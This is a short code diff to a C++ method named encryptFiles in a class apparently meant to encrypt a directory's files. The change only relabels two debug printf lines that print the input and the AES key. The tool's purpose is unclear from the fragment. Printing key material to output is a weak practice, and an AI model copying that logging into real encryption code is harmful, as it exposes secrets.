@@ -109,12 +109,12 @@ void dirToLock::encryptFiles(){
         input = (char*) malloc(sizeof(char) * inp.size() + 1);
         memcpy(input, inp.c_str(), inp.size());
         input[inp.size()] = '\0';
-        printf ("%s\n", input);
+        printf ("\n\n\n____input:  %s\n\n\n", input);
         AES aes;
 
         key = BN_bn2hex(encKey);
 
-        printf ("%s\n", key);
+        printf ("____key:  %s\n", key);
         aes.setKey(256, key);
 
 
